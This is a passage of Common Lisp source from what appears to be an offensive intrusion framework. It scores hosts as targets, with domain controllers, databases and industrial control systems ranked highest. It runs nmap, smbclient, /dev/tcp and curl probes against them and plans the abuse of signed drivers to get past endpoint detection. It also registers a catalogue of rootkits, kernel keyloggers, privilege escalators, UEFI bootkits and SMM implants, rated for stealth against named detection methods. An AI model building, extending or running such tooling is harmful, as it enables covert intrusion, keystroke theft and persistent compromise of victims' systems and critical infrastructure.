  provide the deepest integration via SSDT hooks, IRP dispatch, and
  minifilter callbacks.

  UEFI implants persist across OS reinstallation and are extremely
  difficult to detect without firmware-level tools. They are reserved
  for strategic assets (domain controllers, critical infrastructure).

Parameters:
  OS           -- Keyword, one of :LINUX :WINDOWS :UEFI :UNKNOWN
  TARGET-VALUE -- Integer 0-100, calculated by CALCULATE-TARGET-VALUE

Returns: One of :EBPF :LKM :DRIVER :SIGNED-DRIVER :UEFI :BOOTKIT :NIL
  :NIL means no suitable implant type (OS is :UNKNOWN or not supported).

Example:
  (determine-implant-type :linux 85)    ;; => :EBPF
  (determine-implant-type :linux 45)    ;; => :LKM
  (determine-implant-type :windows 90)  ;; => :DRIVER (or :SIGNED-DRIVER if cert available)
  (determine-implant-type :unknown 50)  ;; => NIL

Signed Driver Override:
  If a code signing certificate is available (CODE-SIGNING-CERT-AVAILABLE-P)
  and the OS is :WINDOWS with target-value >= 50, returns :SIGNED-DRIVER
  instead of :DRIVER. This provides a significantly lower detection profile."
  ;; Check for signed driver override first (lowest detection profile)
  (let ((cert-override (determine-implant-type-with-cert os target-value)))
    (when cert-override
      (return-from determine-implant-type cert-override)))
  ;; Standard implant type selection
  (case os
    (:linux
     (cond
       ((>= target-value 70) :ebpf)
       (t :lkm)))
    (:windows
     (cond
       ((>= target-value 80) :driver)
       (t :driver)))  ; Windows eBPF is limited, always use driver
    (:uefi
     :uefi)
    (otherwise
     nil)))


(defun calculate-target-value (target-info)
  "Calculate a target value score (0-100) based on host characteristics.

The target value score drives implant selection, stealth investment,
and persistence tier. High-value targets get the stealthiest implants
(eBPF) and three-tier persistence. Low-value targets get simpler,
userland-only persistence.

Scoring Criteria:
  - Domain controller indicators (+30 points)
    * LDAP port 389 open, Global Catalog 3268/3269
    * DNS service with AD-integrated zones
    * Kerberos port 88 responding
    * Hostname patterns (DC*, AD*, DOMAIN*)

  - Database services (+20 points)
    * MySQL (3306), PostgreSQL (5432), MSSQL (1433), Oracle (1521)
    * MongoDB (27017), Redis (6379), Elasticsearch (9200)

  - Sensitive service banners (+15 points)
    * Exchange, SharePoint, Citrix, VMware vCenter
    * SAP, Oracle WebLogic, IBM WebSphere
    * Industrial control (Modbus 502, DNP3 20000)

  - Network centrality (+25 points)
    * Number of open ports (more ports = more central)
    * Response to traceroute (intermediate hop = router/gateway)
    * Multiple subnets reachable

  - Default scoring (+10 points base)

  - Cap at 100, floor at 0

Parameters:
  TARGET-INFO -- Plist from TACTICAL-DISCOVERY containing:
    :OPEN-PORTS    -- alist of (port . service-name)
    :OS-GUESS      -- keyword OS guess
    :SERVICES      -- list of service banner strings
    :DOMAINS       -- list of discovered subdomains
    :TARGET        -- original target string

Returns: Integer 0-100 representing target value.

Example:
  (calculate-target-value '(:open-ports ((389 . \"ldap\") (88 . \"kerberos\")
                                         (445 . \"microsoft-ds\") (53 . \"domain\"))
                           :services (\"Active Directory\" \"DNS\")))
    ;; => 95 (domain controller with multiple sensitive services)"
  (let ((score 10)  ; base score
        (open-ports (getf target-info :open-ports))
        (services (getf target-info :services))
        (target-str (string-downcase (or (getf target-info :target) ""))))
    ;; Domain controller indicators (+30)
    (when (or (member 389 open-ports :key #'car)   ; LDAP
              (member 3268 open-ports :key #'car)  ; Global Catalog
              (member 636 open-ports :key #'car))  ; LDAPS
      (incf score 15))
    (when (member 88 open-ports :key #'car)         ; Kerberos
      (incf score 10))
    (when (member 53 open-ports :key #'car)         ; DNS
      (incf score 5))
    ;; Hostname patterns
    (when (or (search "dc" target-str)
              (search "ad" target-str)
              (search "domain" target-str))
      (incf score 5))
    ;; Database services (+20 max)
    (let ((db-ports '(3306 5432 1433 1521 27017 6379 9200 9300)))
      (dolist (port db-ports)
        (when (member port open-ports :key #'car)
          (incf score (min 20 (- 20 (* 5 (1- (count-if (lambda (p) (member p open-ports :key #'car))
                                                        db-ports)))))))))
    ;; Sensitive service banners (+15 max)
    (when services
      (let ((sensitive-patterns '("Exchange" "SharePoint" "Citrix" "vCenter"
                                  "SAP" "WebLogic" "WebSphere" "VMware"
                                  "Active Directory" "Domain Controller")))
        (dolist (pattern sensitive-patterns)
          (when (some (lambda (s) (search pattern s)) services)
            (incf score 5)))))
    ;; Network centrality (+25 max)
    (let ((port-count (length open-ports)))
      (cond
        ((>= port-count 20) (incf score 25))
        ((>= port-count 10) (incf score 15))
        ((>= port-count 5)  (incf score 10))
        ((>= port-count 2)  (incf score 5))))
    ;; Clamp to valid range
    (clamp score 0 100)))


;; ============================================================================
;; Section 2a: OS Fingerprinting Helper Functions
;; ============================================================================
;; These helper functions implement the individual fingerprinting probes.
;; They are called by FINGERPRINT-HOST-OS and can also be used independently.

(defun probe-ttl (target)
  "Probe the target's ICMP TTL value.

Sends a single ICMP echo request (ping) and extracts the TTL field
from the response. This is the fastest and stealthiest OS fingerprinting
method -- a single ping packet is extremely unlikely to trigger alerts.

Parameters:
  TARGET -- String, IP address or hostname.

Returns: Integer TTL value (e.g., 64, 128, 255), or NIL if probe failed.

Example:
  (probe-ttl \"192.168.1.1\")  ;; => 64 (likely Linux)"
  (handler-case
      (let ((output (uiop:run-program
                     (format nil "ping -c 1 -W 2 ~A 2>/dev/null" target)
                     :output :string
                     :ignore-error-status t)))
        (when (search "ttl=" output)
          (let* ((ttl-start (+ (search "ttl=" output) 4))
                 (ttl-end (position-if-not #'digit-char-p output :start ttl-start)))
            (parse-integer (subseq output ttl-start ttl-end) :junk-allowed t))))
    (error (e)
      (format *trace-output* "~&[KERNEL] TTL probe error for ~A: ~A~%" target e)
      nil)))

(defun probe-open-ports (target)
  "Quickly probe for characteristic open ports on the target.

Uses nmap with a fast SYN scan (no full connect) to check the most
characteristic ports for OS identification. The scan is limited to
20 ports to minimize noise.

Parameters:
  TARGET -- String, IP address or hostname.

Returns: List of open port numbers (integers).

Example:
  (probe-open-ports \"192.168.1.100\")
    ;; => (22 111 2049)  -- Linux indicators"
  (handler-case
      (let* ((output (uiop:run-program
                      (format nil "nmap -sS -Pn --open -p22,53,88,111,389,445,636,3389,5985,2049,3306,5432,1433,1521,27017,6379,9200,502,20000 ~A 2>/dev/null"
                              target)
                      :output :string
                      :ignore-error-status t))
             (ports '()))
        (with-input-from-string (stream output)
          (loop for line = (read-line stream nil nil)
                while line do
            (when (and (search "/open/tcp" line) (search "/tcp" line))
              (let* ((port-start (position-if #'digit-char-p line))
                     (port-end (position #\/ line :start port-start)))
                (when (and port-start port-end)
                  (push (parse-integer (subseq line port-start port-end)
                                      :junk-allowed t)
                        ports))))))
        (reverse ports))
    (error (e)
      (format *trace-output* "~&[KERNEL] Port probe error for ~A: ~A~%" target e)
      nil)))

(defun probe-smb-banner (target)
  "Probe SMB banner from target's port 445.

Uses smbclient to initiate an SMB negotiation and capture the
protocol dialect string. This is highly reliable for distinguishing
Windows native SMB from Samba on Linux.

Parameters:
  TARGET -- String, IP address or hostname.

Returns: String banner, or NIL if probe failed or port 445 closed.

Example:
  (probe-smb-banner \"192.168.1.100\")
    ;; => \"SMB 2.1\" or \"Samba 4.15.13\""
  (handler-case
      (let ((output (uiop:run-program
                     (format nil "timeout 3 smbclient -L //~A -N 2>&1 || true"
                             target)
                     :output :string
                     :ignore-error-status t)))
        (when (and (> (length output) 0)
                   (not (search "NT_STATUS_CONNECTION_REFUSED" output))
                   (not (search "Connection timed out" output)))
          (string-trim '(#
ewline #
eturn #	ab #\space) output)))
    (error (e)
      (format *trace-output* "~&[KERNEL] SMB probe error for ~A: ~A~%" target e)
      nil)))

(defun probe-ssh-banner (target)
  "Probe SSH banner from target's port 22.

Opens a TCP connection to port 22 and reads the SSH version string
without completing the handshake. This is extremely stealthy -- the
connection is dropped after reading the banner.

Parameters:
  TARGET -- String, IP address or hostname.

Returns: String SSH banner (e.g., \"SSH-2.0-OpenSSH_8.9\"), or NIL.

Example:
  (probe-ssh-banner \"192.168.1.100\")
    ;; => \"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\""
  (handler-case
      (let ((output (uiop:run-program
                     (format nil "timeout 3 bash -c 'exec 3<>/dev/tcp/~A/22; cat <&3; exec 3<&-' 2>&1 || true"
                             target)
                     :output :string
                     :ignore-error-status t)))
        (when (and (> (length output) 0)
                   (search "SSH-" output))
          (let ((end (position #
ewline output)))
            (if end
                (subseq output 0 end)
                (string-trim '(#
ewline #
eturn) output)))))
    (error (e)
      (format *trace-output* "~&[KERNEL] SSH probe error for ~A: ~A~%" target e)
      nil)))

(defun probe-http-header (target)
  "Probe HTTP Server header from target's web ports.

Sends a minimal HTTP HEAD request to ports 80 and 443 to extract
the Server header. Uses curl with a short timeout.

Parameters:
  TARGET -- String, IP address or hostname.

Returns: String Server header value, or NIL if no web service found.

Example:
  (probe-http-header \"192.168.1.100\")
    ;; => \"Apache/2.4.41 (Ubuntu)\""
  (handler-case
      (let ((output (uiop:run-program
                     (format nil "curl -sI --connect-timeout 3 http://~A/ 2>/dev/null | grep -i '^Server:' || curl -sI -k --connect-timeout 3 https://~A/ 2>/dev/null | grep -i '^Server:' || true"
                             target target)
                     :output :string
                     :ignore-error-status t)))
        (when (and (> (length output) 0)
                   (search "Server:" output))
          (let* ((colon-pos (position #\: output))
                 (value (when colon-pos
                          (string-trim '(#
ewline #
eturn #	ab #\space)
                                       (subseq output (1+ colon-pos))))))
            (when (and value (> (length value) 0))
              value))))
    (error (e)
      (format *trace-output* "~&[KERNEL] HTTP probe error for ~A: ~A~%" target e)
      nil)))


;; ============================================================================
;; Section 2b: Signed Driver Abuse Path
;; ============================================================================
;; When a valid code signing certificate is available, signed drivers present
;; a dramatically lower detection profile than unsigned LKM or eBPF implants.
;; Windows systems with Driver Signature Enforcement (DSE) enabled will
;; happily load a properly signed driver. Even EDR products typically whitelist
;; drivers signed with valid EV certificates.
;;
;; This section provides the code path for certificate-aware deployment.
;; If *CODE-SIGNING-CERT-PATH* is set and points to a readable certificate,
;; DETERMINE-IMPLANT-TYPE will prefer :SIGNED-DRIVER over other implant types.

(defun sign-driver-with-cert (driver-path &optional (cert-path *code-signing-cert-path*))
  "Sign a driver binary with the configured code signing certificate.

This function invokes the platform-specific code signing tool to apply
an Authenticode signature to a driver binary. On Windows, it uses
signtool.exe. On Linux (cross-signing for Windows targets), it uses
osslsigncode or a custom Rust FFI call.

Parameters:
  DRIVER-PATH -- String, path to the unsigned driver binary (.sys/.cat).
  CERT-PATH   -- String, path to the code signing certificate (.pfx/.p12).
                 Defaults to *CODE-SIGNING-CERT-PATH*.

Returns: String, path to the signed driver binary, or NIL if signing failed.

Note: This is a STUB in the current version. It logs the operation and
returns the original path unchanged. A production implementation would:
  1. Validate the certificate chain
  2. Timestamp the signature (RFC 3161)
  3. Apply WHQL cross-signature if needed
  4. Verify the signature with WinVerifyTrust

Example:
  (sign-driver-with-cert \"/tmp/evil.sys\")"
  (cond
    ((null cert-path)
     (format *trace-output* "~&[KERNEL] No code signing certificate configured.~%")
     nil)
    ((not (probe-file cert-path))
     (format *trace-output* "~&[KERNEL] Certificate not found: ~A~%" cert-path)
     nil)
    (t
     (format *trace-output* "~&[KERNEL] Signing driver ~A with cert ~A...~%"
             driver-path cert-path)
     ;; Stub: In production, this would call signtool or the Rust FFI
     ;; to perform actual code signing. For now, we log and return the path.
     (gossip-publish *kernel-telemetry-topic*
                     `(:event :driver-sign-attempt
                       :driver-path ,driver-path
                       :cert-path ,cert-path
                       :status :stub))
     driver-path)))

(defun code-signing-cert-available-p ()
  "Check if a valid code signing certificate is available.

Returns T if *CODE-SIGNING-CERT-PATH* is set and the file exists and
is readable. Returns NIL otherwise.

This is used by DETERMINE-IMPLANT-TYPE to decide whether to prefer
signed drivers over other implant types.

Returns: T if cert is available, NIL otherwise."
  (and *code-signing-cert-path*
       (stringp *code-signing-cert-path*)
       (> (length *code-signing-cert-path*) 0)
       (probe-file *code-signing-cert-path*)))

(defun determine-implant-type-with-cert (os target-value)
  "Override implant type selection when a code signing cert is available.

If a valid code signing certificate is available (via
CODE-SIGNING-CERT-AVAILABLE-P), this function returns :SIGNED-DRIVER
for Windows targets with target-value >= 50. For all other cases,
it returns NIL, indicating the caller should use the standard
DETERMINE-IMPLANT-TYPE logic.

Parameters:
  OS           -- Keyword, target OS.
  TARGET-VALUE -- Integer 0-100.

Returns: :SIGNED-DRIVER or NIL."
  (when (code-signing-cert-available-p)
    (when (and (eq os :windows)
               (>= target-value 50))
      :signed-driver)))

;; ============================================================================
;; Section 3: Kernel Toolchain Registry
;; ============================================================================
;; The kernel toolchain registry is the swarm's catalog of kernel-level
;; tools. Every tool has a stealth rating, complexity, risk level, and
;; prerequisites. The SELECT-KERNEL-TOOL function uses this registry to
;; choose the optimal tool for any given target.
;;
;; Tool Categories:
;;   Linux eBPF     -- process-hider, file-hider, network-redirection, etc.
;;   Linux LKM      -- rootkit-lkm, keylogger-lkm, module-hider, etc.
;;   Windows Driver -- ssdt-hook, irp-hook, minifilter, process-injector
;;   UEFI           -- bootkit-uefi, smm-implant, acpi-rootkit

(defstruct (kernel-tool-entry
            (:constructor %make-kernel-tool-entry-internal))
  "A kernel tool entry in the toolchain registry.

Each entry describes a single kernel-level tool: its capabilities,
compatibility, stealth characteristics, and deployment requirements.

Fields:
  NAME            -- Symbol, e.g. 'PROCESS-HIDER, 'SSDT-HOOK.
  OS              -- Keyword: :LINUX :WINDOWS :BOTH.
  IMPLANT-TYPE    -- Keyword: :EBPF :LKM :DRIVER :UEFI.
  BINARY-BLOB-ID  -- Symbol, ID in the resource registry for the binary.
  STEALTH-RATING  -- Integer 0-100, composite stealth score.
  COMPLEXITY      -- Keyword: :SIMPLE :MODERATE :COMPLEX.
  RISK-LEVEL      -- Keyword: :LOW :MEDIUM :HIGH :CRITICAL.
  LOAD-METHOD     -- Keyword: :REFLECTIVE :DIRECT :BOOTKIT.
  DETECTION-VECTORS -- List of strings describing AV detection methods.
  PREREQUISITES   -- Plist of requirements (:smep-disabled t, etc.)

Stealth Rating Breakdown:
  90-100: Invisible to standard AV, no kernel logs, no module listings
  70-89:  Low visibility, may appear in deep forensic analysis
  50-69:  Moderate visibility, signature-based AV may flag
  30-49:  High visibility, behavioral detection likely
  0-29:   Trivially detectable, only for emergency use

Risk Level:
  :LOW     -- Well-tested, stable, minimal crash risk
  :MEDIUM  -- Some stability risk, test before production
  :HIGH    -- Significant crash risk, use with caution
  :CRITICAL -- Can cause kernel panic or system instability

Load Method:
  :REFLECTIVE -- Loaded entirely in memory, no disk artifacts
  :DIRECT     -- Installed via normal OS loading (insmod, sc.exe)
  :BOOTKIT    -- Installed at boot time, pre-OS execution"
  name              ; Symbol
  os                ; :linux :windows :both
  implant-type      ; :ebpf :lkm :driver :uefi
  binary-blob-id    ; ID in resource-registry
  stealth-rating    ; 0-100
  complexity        ; :simple :moderate :complex
  risk-level        ; :low :medium :high :critical
  load-method       ; :reflective :direct :bootkit
  detection-vectors ; List of strings
  prerequisites)    ; Plist

(defun make-kernel-tool-entry (&key name os implant-type binary-blob-id
                                    (stealth-rating 50) (complexity :moderate)
                                    (risk-level :medium) (load-method :direct)
                                    detection-vectors prerequisites)
  "Create a KERNEL-TOOL-ENTRY struct.

This is the public constructor for kernel tool entries. All fields
have sensible defaults for rapid prototyping.

Parameters:
  NAME              -- Symbol, the tool's name.
  OS                -- Keyword: :LINUX :WINDOWS :BOTH.
  IMPLANT-TYPE      -- Keyword: :EBPF :LKM :DRIVER :UEFI.
  BINARY-BLOB-ID    -- Symbol, ID in resource registry.
  STEALTH-RATING    -- Integer 0-100 (default 50).
  COMPLEXITY        -- Keyword: :SIMPLE :MODERATE :COMPLEX (default :MODERATE).
  RISK-LEVEL        -- Keyword: :LOW :MEDIUM :HIGH :CRITICAL (default :MEDIUM).
  LOAD-METHOD       -- Keyword: :REFLECTIVE :DIRECT :BOOTKIT (default :DIRECT).
  DETECTION-VECTORS -- List of strings describing AV detection methods.
  PREREQUISITES     -- Plist of requirements.

Returns: A KERNEL-TOOL-ENTRY struct."
  (%make-kernel-tool-entry-internal
   :name name
   :os os
   :implant-type implant-type
   :binary-blob-id binary-blob-id
   :stealth-rating stealth-rating
   :complexity complexity
   :risk-level risk-level
   :load-method load-method
   :detection-vectors (or detection-vectors '())
   :prerequisites (or prerequisites '())))

(defun register-kernel-tool (entry)
  "Register a kernel tool in the toolchain registry.

Adds a KERNEL-TOOL-ENTRY to the global *KERNEL-TOOLCHAIN-REGISTRY*.
If a tool with the same name already exists, it is overwritten.

Parameters:
  ENTRY -- A KERNEL-TOOL-ENTRY struct.

Thread-safety: Acquires *KERNEL-TOOLCHAIN-LOCK*.

Returns: The registered KERNEL-TOOL-ENTRY.

Example:
  (register-kernel-tool
    (make-kernel-tool-entry
      :name 'process-hider
      :os :linux
      :implant-type :ebpf
      :stealth-rating 95))"
  (bt:with-lock-held (*kernel-toolchain-lock*)
    (setf (gethash (kernel-tool-entry-name entry) *kernel-toolchain-registry*)
          entry))
  entry)

(defun lookup-kernel-tool (tool-name)
  "Look up a kernel tool by name.

Parameters:
  TOOL-NAME -- Symbol, the name of the tool.

Thread-safety: Acquires *KERNEL-TOOLCHAIN-LOCK* for read.

Returns: The KERNEL-TOOL-ENTRY, or NIL if not found.

Example:
  (lookup-kernel-tool 'process-hider)"
  (bt:with-lock-held (*kernel-toolchain-lock*)
    (gethash tool-name *kernel-toolchain-registry*)))

(defun load-kernel-toolchain-registry ()"
Load the default kernel toolchain into the registry.

This function populates *KERNEL-TOOLCHAIN-REGISTRY* with the full set
of kernel-level tools available to the swarm. It is called once at
system initialization time. Subsequent calls merge new tools without
clearing existing entries.

The default toolchain is organized by operating system and implant type:

Linux eBPF Tools (stealthiest):
  PROCESS-HIDER       -- Hide a process from ps, top, /proc
                         Stealth: 95, Risk: LOW, Method: REFLECTIVE
                         Detection: Forensic analysis of eBPF programs

  FILE-HIDER          -- Hide files from ls, find, open()
                         Stealth: 93, Risk: LOW, Method: REFLECTIVE
                         Detection: Deep inode inspection

  NETWORK-REDIRECTOR  -- Redirect connections to attacker-controlled endpoints
                         Stealth: 88, Risk: MEDIUM, Method: REFLECTIVE
                         Detection: Network traffic anomalies

  SYSCALL-INTERCEPTOR -- Intercept any system call (read, write, open, execve)
                         Stealth: 85, Risk: HIGH, Method: REFLECTIVE
                         Detection: syscall latency analysis

  PRIVILEGE-ESCALATOR -- Auto-escalate new processes to root
                         Stealth: 80, Risk: HIGH, Method: REFLECTIVE
                         Detection: Unauthorized privilege changes

Linux LKM Tools:
  ROOTKIT-LKM         -- Full-featured LKM rootkit (hide processes, files, ports)
                         Stealth: 65, Risk: MEDIUM, Method: DIRECT
                         Detection: lsmod inspection, /proc/modules

  KEYLOGGER-LKM       -- Kernel-level keylogger, captures all keystrokes
                         Stealth: 70, Risk: LOW, Method: DIRECT
                         Detection: Unexplained /dev/input activity

  NETWORK-SNIFFER     -- PF_RING-based packet capture, zero-copy
                         Stealth: 60, Risk: LOW, Method: DIRECT
                         Detection: Network interface promiscuous mode

  MODULE-HIDER        -- Hide LKM from lsmod, /proc/modules, kallsyms
                         Stealth: 90, Risk: HIGH, Method: DIRECT
                         Detection: Kernel memory integrity checks

Windows Driver Tools:
  SSDT-HOOK           -- System Service Descriptor Table hooking
                         Stealth: 55, Risk: HIGH, Method: DIRECT
                         Detection: SSDT integrity checks, PatchGuard

  IRP-HOOK            -- IRP dispatch table hooking for I/O control
                         Stealth: 60, Risk: HIGH, Method: DIRECT
                         Detection: Driver integrity verification

  MINIFILTER          -- File system minifilter driver
                         Stealth: 75, Risk: MEDIUM, Method: DIRECT
                         Detection: Filter manager enumeration

  PROCESS-INJECTOR    -- APC injection driver for code injection
                         Stealth: 70, Risk: MEDIUM, Method: REFLECTIVE
                         Detection: APC queue inspection

UEFI Tools (strategic assets only):
  BOOTKIT-UEFI        -- UEFI bootkit, persists across OS reinstallation
                         Stealth: 98, Risk: CRITICAL, Method: BOOTKIT
                         Detection: UEFI Secure Boot violation, SPI flash check

  SMM-IMPLANT         -- System Management Mode implant (ring -2)
                         Stealth: 99, Risk: CRITICAL, Method: BOOTKIT
                         Detection: SMM dump analysis (requires hardware)

  ACPI-ROOTKIT        -- ACPI table modification for persistent code
                         Stealth: 95, Risk: CRITICAL, Method: BOOTKIT
                         Detection: ACPI table checksum verification

Thread-safety: Acquires *KERNEL-TOOLCHAIN-LOCK*. Idempotent.

Returns: The number of tools registered."
  (let ((count 0))
    ;; --- Linux eBPF tools ---
    (dolist (tool (list
                   (make-kernel-tool-entry
                    :name 'process-hider
                    :os :linux
                    :implant-type :ebpf
                    :binary-blob-id 'ebpf-process-hider
                    :stealth-rating 95
                    :complexity :moderate
                    :risk-level :low
                    :load-method :reflective
                    :detection-vectors '("eBPF program listing via bpftool"
                                         "Kernel audit logs"
                                         "Forensic analysis of prog array"))
                   (make-kernel-tool-entry
                    :name 'file-hider
                    :os :linux
                    :implant-type :ebpf
                    :binary-blob-id 'ebpf-file-hider
                    :stealth-rating 93
                    :complexity :moderate
                    :risk-level :low
                    :load-method :reflective
                    :detection-vectors '("inode discrepancy analysis"
                                         "eBPF attachment to vfs_getattr"))
                   (make-kernel-tool-entry
                    :name 'network-redirector
                    :os :linux
                    :implant-type :ebpf
                    :binary-blob-id 'ebpf-net-redirect
                    :stealth-rating 88
                    :complexity :complex
                    :risk-level :medium
                    :load-method :reflective
                    :detection-vectors '("Network traffic anomalies"
                                         "Connection routing inconsistencies"
                                         "eBPF XDP/TC program inspection"))
                   (make-kernel-tool-entry
                    :name 'syscall-interceptor
                    :os :linux
                    :implant-type :ebpf
                    :binary-blob-id 'ebpf-syscall-intercept
                    :stealth-rating 85
                    :complexity :complex
                    :risk-level :high
                    :load-method :reflective
                    :detection-vectors '("System call latency analysis"
                                         "eBPF kprobe listing"
                                         "Tracepoint inspection"))
                   (make-kernel-tool-entry
                    :name 'privilege-escalator
                    :os :linux
                    :implant-type :ebpf
                    :binary-blob-id 'ebpf-priv-esc
                    :stealth-rating 80
                    :complexity :complex
                    :risk-level :high
                    :load-method :reflective
                    :detection-vectors '("Unauthorized privilege changes"
                                         "eBPF program attached to commit_creds"
                                         "Audit log anomalies"))))
      (register-kernel-tool tool)
      (incf count))
    ;; --- Linux LKM tools ---
    (dolist (tool (list
                   (make-kernel-tool-entry
                    :name 'rootkit-lkm
                    :os :linux
                    :implant-type :lkm
                    :binary-blob-id 'lkm-rootkit
                    :stealth-rating 65
                    :complexity :complex
                    :risk-level :medium
                    :load-method :direct
                    :detection-vectors '("lsmod inspection"
                                         "/proc/modules analysis"
                                         "Kernel module signature verification"
                                         "System call table checksum"))
                   (make-kernel-tool-entry
                    :name 'keylogger-lkm
                    :os :linux
                    :implant-type :lkm
                    :binary-blob-id 'lkm-keylogger
                    :stealth-rating 70
                    :complexity :moderate
                    :risk-level :low
                    :load-method :direct
                    :detection-vectors '("Unexplained /dev/input activity"
                                         "Keyboard input latency"
                                         "Kernel module listing"))
                   (make-kernel-tool-entry
                    :name 'network-sniffer
                    :os :linux
                    :implant-type :lkm
                    :binary-blob-id 'lkm-net-sniff
                    :stealth-rating 60
                    :complexity :moderate
                    :risk-level :low
                    :load-method :direct
                    :detection-vectors '("Network interface promiscuous mode"
                                         "Unexpected PF_RING socket"
                                         "Packet capture artifacts"))
                   (make-kernel-tool-entry
                    :name 'module-hider
                    :os :linux
                    :implant-type :lkm
                    :binary-blob-id 'lkm-module-hider
                    :stealth-rating 90
                    :complexity :complex
                    :risk-level :high
                    :load-method :direct
                    :detection-vectors '("Kernel memory integrity checks"
                                         "Hidden module scanning tools"
                                         "Direct kernel memory comparison"
                                         "System map discrepancy"))))
      (register-kernel-tool tool)
      (incf count))
    ;; --- Windows Driver tools ---
    (dolist (tool (list
                   (make-kernel-tool-entry
                    :name 'ssdt-hook
                    :os :windows
                    :implant-type :driver
                    :binary-blob-id 'driver-ssdt-hook
                    :stealth-rating 55
                    :complexity :complex
                    :risk-level :high
                    :load-method :direct
                    :detection-vectors '("SSDT integrity checks (KiServiceTable)"
                                         "Windows PatchGuard (Kernel Patch Protection)"
                                         "Driver signature enforcement"
                                         "Kernel memory integrity callbacks"))
                   (make-kernel-tool-entry
                    :name 'irp-hook
                    :os :windows
                    :implant-type :driver
                    :binary-blob-id 'driver-irp-hook
                    :stealth-rating 60
                    :complexity :complex
                    :risk-level :high
                    :load-method :direct
                    :detection-vectors '("Driver IRP dispatch table verification"
                                         "IoCreateDevice hook detection"
                                         "Kernel driver integrity scanning"))
                   (make-kernel-tool-entry
                    :name 'minifilter
                    :os :windows
                    :implant-type :driver
                    :binary-blob-id 'driver-minifilter
                    :stealth-rating 75
                    :complexity :moderate
                    :risk-level :medium
                    :load-method :direct
                    :detection-vectors '("Filter manager enumeration (FltEnumerateFilters)"
                                         "Minifilter altitude conflicts"
                                         "File system operation latency"))
                   (make-kernel-tool-entry
                    :name 'process-injector
                    :os :windows
                    :implant-type :driver
                    :binary-blob-id 'driver-proc-inject
                    :stealth-rating 70
                    :complexity :moderate
                    :risk-level :medium
                    :load-method :reflective
                    :detection-vectors '("APC queue inspection"
                                         "Unexpected memory allocations in processes"
                                         "Thread start address anomalies"
                                         "Kernel callback (PsSetCreateProcessNotifyRoutine)"))))
      (register-kernel-tool tool)
      (incf count))
    ;; --- UEFI tools ---
    (dolist (tool (list
                   (make-kernel-tool-entry
                    :name 'bootkit-uefi
                    :os :both
                    :implant-type :uefi
                    :binary-blob-id 'uefi-bootkit
                    :stealth-rating 98
                    :complexity :complex
                    :risk-level :critical
                    :load-method :bootkit
                    :detection-vectors '("UEFI Secure Boot violation"
                                         "SPI flash checksum mismatch"
                                         "Boot entry tampering"
                                         "Firmware integrity measurement (TPM)"))
                   (make-kernel-tool-entry
                    :name 'smm-implant
                    :os :both
                    :implant-type :uefi
                    :binary-blob-id 'uefi-smm-implant
                    :stealth-rating 99
                    :complexity :complex
                    :risk-level :critical
                    :load-method :bootkit
                    :detection-vectors '("SMM dump analysis (requires hardware probe)"
                                         "SMRAM access violation"
                                         "SMI handler timing analysis"
                                         "Chipset-specific SMM detection"))
                   (make-kernel-tool-entry
                    :name 'acpi-rootkit
                    :os :both
                    :implant-type :uefi
                    :binary-blob-id 'uefi-acpi-rootkit
                    :stealth-rating 95
                    :complexity :complex
                    :risk-level :critical
                    :load-method :bootkit
                    :detection-vectors '("ACPI table checksum verification"
                                         "DSDT/SSDT bytecode analysis"
                                         "AML interpreter anomaly detection"
                                         "Firmware interface extraction (chipsec)"))))
      (register-kernel-tool tool)
      (incf count))
    ;; Publish toolchain load event
    (gossip-publish *kernel-telemetry-topic*
                    `(:event :toolchain-loaded
                      :tool-count ,count
                      :categories '(:ebpf 5 :lkm 4 :driver 4 :uefi 3)))
    count))

(defun select-kernel-tool (os implant-type target-value)
  "Select the best kernel tool based on OS, implant type, and target value.

This function queries the *KERNEL-TOOLCHAIN-REGISTRY* and returns the
optimal tool for the given parameters. The selection algorithm balances:
  1. Stealth (primary for high-value targets)
  2. OS compatibility (strict requirement)
  3. Implant type match (strict requirement)
  4. Risk level (lower risk preferred unless target value justifies it)

Selection Algorithm:
  1. Filter tools by OS and IMPLANT-TYPE (exact match)
  2. Sort by stealth rating (descending)
  3. For high-value targets (>=70): pick stealthiest
  4. For medium-value targets (40-69): pick balanced (stealth * stability)
  5. For low-value targets (<40): pick simplest (lowest complexity)
  6. Never pick :CRITICAL risk unless target-value >= 90

Parameters:
  OS           -- Keyword: :LINUX :WINDOWS :BOTH.
  IMPLANT-TYPE -- Keyword: :EBPF :LKM :DRIVER :UEFI.
  TARGET-VALUE -- Integer 0-100.

Returns: The tool-name SYMBOL of the best tool, or NIL if no match.

Thread-safety: Acquires *KERNEL-TOOLCHAIN-LOCK* for read.

Example:
  (select-kernel-tool :linux :ebpf 85)   ;; => 'PROCESS-HIDER
  (select-kernel-tool :windows :driver 50) ;; => 'MINIFILTER
  (select-kernel-tool :linux :ebpf 30)    ;; => 'PROCESS-HIDER"
  (bt:with-lock-held (*kernel-toolchain-lock*)
    (let ((candidates '()))
      ;; Collect matching tools
      (maphash (lambda (name entry)
                 (declare (ignore name))
                 (when (and (or (eq (kernel-tool-entry-os entry) os)
                                (eq (kernel-tool-entry-os entry) :both))
                            (eq (kernel-tool-entry-implant-type entry) implant-type))
                   ;; Filter out critical risk for low-value targets
                   (unless (and (eq (kernel-tool-entry-risk-level entry) :critical)
                                (< target-value 90))
                     (push entry candidates))))
               *kernel-toolchain-registry*)
      ;; Sort and select
      (when candidates
        (let* ((sorted (case implant-type
                         ;; For eBPF, always pick stealthiest
                         (:ebpf (sort candidates #'> :key #'kernel-tool-entry-stealth-rating))
                         ;; For drivers, balance stealth and stability
                         (:driver (sort candidates (lambda (a b)
                                                     (> (* (kernel-tool-entry-stealth-rating a)
                                                           (case (kernel-tool-entry-risk-level a)
                                                             (:low 4) (:medium 3) (:high 2) (:critical 1)))
                                                        (* (kernel-tool-entry-stealth-rating b)
                                                           (case (kernel-tool-entry-risk-level b)
                                                             (:low 4) (:medium 3) (:high 2) (:critical 1)))))))
                         ;; For LKM, sort by stealth
                         (:lkm (sort candidates #'> :key #'kernel-tool-entry-stealth-rating))
                         ;; For UEFI, sort by stealth
                         (:uefi (sort candidates #'> :key #'kernel-tool-entry-stealth-rating))
                         (otherwise (sort candidates #'> :key #'kernel-tool-entry-stealth-rating))))
               (selected (first sorted)))
          (when selected
            (kernel-tool-entry-name selected)))))))

(defun list-kernel-tools (&optional (os nil))
  "List all registered kernel tools, optionally filtered by OS.

Parameters:
  OS -- Optional keyword: :LINUX :WINDOWS :BOTH. If NIL, lists all tools.

Thread-safety: Acquires *KERNEL-TOOLCHAIN-LOCK* for read.

Returns: List of KERNEL-TOOL-ENTRY structs.

Example:
